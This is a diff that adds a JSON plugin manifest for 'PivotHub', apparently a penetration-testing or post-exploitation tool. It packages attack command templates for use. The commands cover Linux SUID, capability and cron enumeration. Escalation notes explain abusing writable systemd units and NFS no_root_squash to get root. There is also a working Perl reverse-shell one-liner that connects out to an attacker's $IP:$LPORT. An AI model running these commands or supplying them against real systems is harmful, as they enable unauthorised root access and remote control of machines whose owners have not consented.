@@ -1,0 +1,123 @@
+{
+  "version": 1,
+  "updatedAt": "2026-09-09",
+  "note": "PivotHub 插件市场清单（数据插件）。可用环境变量 PIVOTHUB_PLUGIN_REGISTRY 指向远程清单 URL。",
+  "plugins": [
+    {
+      "id": "linux-privesc-extra",
+      "name": "Linux 提权命令扩展包",
+      "type": "commands",
+      "version": "1.0.0",
+      "author": "PivotHub 社区",
+      "description": "补充 3 条命令模板：SUID 全盘枚举、capabilities 枚举、cron / 可写文件检查。",
+      "homepage": "",
+      "files": [
+        {
+          "path": "commands/linux-privesc-extra.json",
+          "content": [
+            {
+              "id": "pl-linux-suid",
+              "category": "Linux 提权",
+              "os": "Linux",
+              "title": "SUID 全盘枚举（排除挂载点）",
+              "cmd": "find / -xdev -perm -4000 -type f 2>/dev/null | head -50",
+              "note": "拿到清单后到 GTFOBins 查对应二进制的利用方式"
+            },
+            {
+              "id": "pl-linux-cap",
+              "category": "Linux 提权",
+              "os": "Linux",
+              "title": "capabilities 枚举",
+              "cmd": "getcap -r / 2>/dev/null | head -30",
+              "note": "cap_setuid / cap_dac_read_search 等可直接提权"
+            },
+            {
+              "id": "pl-linux-cron",
+              "category": "Linux 提权",
+              "os": "Linux",
+              "title": "cron 与可写文件检查",
+              "cmd": "ls -la /etc/cron.d /etc/crontab /var/spool/cron 2>/dev/null; find /etc/cron* -writable 2>/dev/null",
+              "note": "可写 cron 脚本 → 以 root 身份执行"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "privesc-rules-extra",
+      "name": "提权规则扩展包",
+      "type": "privesc",
+      "version": "1.0.0",
+      "author": "PivotHub 社区",
+      "description": "为「提权智能匹配」补充 2 条规则：可写 systemd 服务、NFS no_root_squash。",
+      "homepage": "",
+      "files": [
+        {
+          "path": "privesc/extra.json",
+          "content": [
+            {
+              "id": "pl-linux-writable-systemd",
+              "name": "可写的 systemd 服务单元",
+              "platform": "linux",
+              "risk": "中",
+              "reliability": 70,
+              "match": "(?m)^/etc/systemd/system/\\S+\\.service$",
+              "cmd": "systemctl list-units --type=service --state=running",
+              "note": "改写单元文件里的 ExecStart 为提权命令后 systemctl daemon-reload && restart 即可以 root 执行。"
+            },
+            {
+              "id": "pl-linux-nfs-no-root-squash",
+              "name": "NFS no_root_squash",
+              "platform": "linux",
+              "risk": "中",
+              "reliability": 65,
+              "match": "no_root_squash",
+              "cmd": "cat /etc/exports 2>/dev/null; mount | grep nfs",
+              "note": "攻击机以 root 挂载共享后写入 SUID shell，回到目标执行即可提权。"
+            }
+          ]
+        }
+      ]
+    },
+    {
+      "id": "tty-fixes-extra",
+      "name": "终端固化技法扩展包",
+      "type": "tty_fixes",
+      "version": "1.0.0",
+      "author": "PivotHub 社区",
+      "description": "补充 2 条 Linux 终端固化技法（perl 与 busybox）。",
+      "homepage": "",
+      "files": [
+        {
+          "path": "tty_fixes/extra.json",
+          "content": [
+            {
+              "id": "pl-tty-perl",
+              "name": "Perl 反向 PTY",
+              "platform": "linux",
+              "target": "linux",
+              "needs": ["perl"],
+              "reliability": 75,
+              "risk": "低",
+              "cmd": "perl -e 'use Socket;$i=\"$IP\";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+              "note": "无 python3 时的备选；需要攻击机在 $IP:$LPORT 监听",
+              "manual": false
+            },
+            {
+              "id": "pl-tty-busybox",
+              "name": "busybox 内置 sh 交互",
+              "platform": "linux",
+              "target": "linux",
+              "needs": ["busybox"],
+              "reliability": 70,
+              "risk": "低",
+              "cmd": "busybox sh -i",
+              "note": "嵌入式 / 精简镜像常见；配合 script 或 socat 升级为完整 PTY",
+              "manual": false
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
